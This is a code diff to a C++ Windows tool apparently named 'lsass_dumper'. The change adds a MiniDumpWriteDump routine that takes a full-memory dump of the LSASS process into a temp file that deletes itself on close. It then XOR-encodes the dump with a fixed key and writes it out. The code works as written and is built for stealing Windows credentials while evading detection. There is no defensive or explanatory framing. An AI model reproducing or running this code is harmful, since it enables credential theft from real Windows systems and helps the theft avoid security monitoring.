@@ -6,10 +6,50 @@
 #include <psapi.h>
 #include <iostream>
 #include <fstream>
+#include <vector>
+#include <psapi.h>
+#include <DbgHelp.h>
 
 #define XOR_KEY 0x41
 
+#pragma comment(lib, "Psapi.lib")
+#pragma comment(lib, "Dbghelp.lib")
 
+typedef BOOL(WINAPI* MiniDumpWriteDump_t)(
+    HANDLE hProcess,
+    DWORD ProcessId,
+    HANDLE hFile,
+    MINIDUMP_TYPE DumpType,
+    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
+    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
+    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
+);
+
+BOOL CALLBACK MiniDumpCallback(
+    PVOID CallbackParam,
+    PMINIDUMP_CALLBACK_INPUT CallbackInput,
+    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
+) {
+    if (!CallbackOutput || !CallbackInput) 
+        return true;
+    
+    switch (CallbackInput->CallbackType) {
+        case ModuleCallback:
+            if (CallbackOutput->ModuleWriteFlags & ModuleReferencedByMemory)
+                CallbackOutput->ModuleWriteFlags &= ~ModuleReferencedByMemory;
+            CallbackOutput->ModuleWriteFlags |= ModuleWriteModule | 
+                                            ModuleWriteMiscRecord | 
+                                            ModuleWriteCvRecord;
+            return true;
+        case ThreadCallback:
+            CallbackOutput->ThreadWriteFlags = ThreadWriteThread | 
+                                          ThreadWriteContext | 
+                                          ThreadWriteInstructionWindow;
+            return true;
+        default:
+            return true;
+    }
+}
 
 void Log(const std::string& msg) {
     std::ofstream log("C:\\Windows\\Temp\\lsass_dumper.log", std::ios::app);
@@ -80,6 +120,117 @@ void DumpAndEncodeMemory(HANDLE hProc, std::ofstream& outFile) {
     }
 }
 
+void DumpAndEncodeMemoryMiniDump(HANDLE hProc, DWORD hPID, std::ofstream& outFile){
+    std::vector<BYTE> outputBuffer;
+
+    WCHAR tempPath[MAX_PATH] = {};
+    WCHAR tempFileName[MAX_PATH] = {};
+
+
+    // Create temp file
+    if (!GetTempPathW(MAX_PATH, tempPath)) {
+        CloseHandle(hProc);
+        return;
+    }
+
+    if (!GetTempFileNameW(tempPath, L"LSA", 0, tempFileName)) {
+        CloseHandle(hProc);
+        return;
+    }
+
+    HANDLE hFile = CreateFileW(
+        tempFileName,
+        GENERIC_READ | GENERIC_WRITE,
+        0,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
+        NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        CloseHandle(hProc);
+        return;
+    }
+    
+    // load dbhhelp.dll for MiniDumpWriteDump
+    HMODULE hDbgHelp = LoadLibraryW(L"dbghelp.dll");
+
+    auto pMiniDumpWriteDump = (MiniDumpWriteDump_t)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
+
+    MINIDUMP_CALLBACK_INFORMATION callbackInfo = {};
+    callbackInfo.CallbackRoutine = MiniDumpCallback;
+
+    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
+        MiniDumpWithFullMemory |
+        MiniDumpWithHandleData |
+        MiniDumpWithUnloadedModules |
+        MiniDumpWithThreadInfo |
+        MiniDumpWithFullMemoryInfo |
+        MiniDumpWithProcessThreadData |
+        MiniDumpWithIndirectlyReferencedMemory
+    );
+
+    BOOL result = pMiniDumpWriteDump(
+        hProc,
+        hPID,
+        hFile,
+        dumpType,
+        NULL,
+        NULL,
+        &callbackInfo
+    );
+    if (!result){
+        // failed minidump
+        std::cerr << "Failed to dump process. Error: " << std::hex << GetLastError();
+        // cleanup
+        FreeLibrary(hDbgHelp);
+        CloseHandle(hFile);
+        CloseHandle(hProc);
+        return;
+    }
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
+        FreeLibrary(hDbgHelp);
+        CloseHandle(hFile);
+        CloseHandle(hProc);
+        return;
+    }
+
+    outputBuffer.resize(fileSize);
+
+    // Reset file pointer before reading it...
+    if (SetFilePointer(hFile, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
+        FreeLibrary(hDbgHelp);
+        CloseHandle(hFile);
+        CloseHandle(hProc);
+        return;
+    }
+
+    DWORD bytesRead = 0;
+    if (!ReadFile(hFile, outputBuffer.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
+        FreeLibrary(hDbgHelp);
+        CloseHandle(hFile);
+        CloseHandle(hProc);
+        return;
+    }
+
+    // Sweet Victory! Let's encrypt this
+
+    for (size_t i = 0; i < outputBuffer.size(); ++i) {
+        outputBuffer[i] ^= XOR_KEY;
+    }
+
+    outFile.write(reinterpret_cast<char*>(outputBuffer.data()), bytesRead);
+
+
+    FreeLibrary(hDbgHelp);
+    CloseHandle(hFile);
+    CloseHandle(hProc);
+
+}
+
 int main() {
     if (!EnableDebugPrivilege()) {
         Log("[-] Failed to enable debug privileges.");
@@ -111,7 +262,8 @@ int main() {
     }
     Log("[*] LSASS process opened successfully. PID: " + std::to_string(pid));
     std::cout << "[*] Starting LSASS memory copy + XOR encoding...\n";
-    DumpAndEncodeMemory(hProc, outFile);
+    // DumpAndEncodeMemory(hProc, outFile);
+    DumpAndEncodeMemoryMiniDump(hProc, pid, outFile);
 
     outFile.close();
     CloseHandle(hProc);
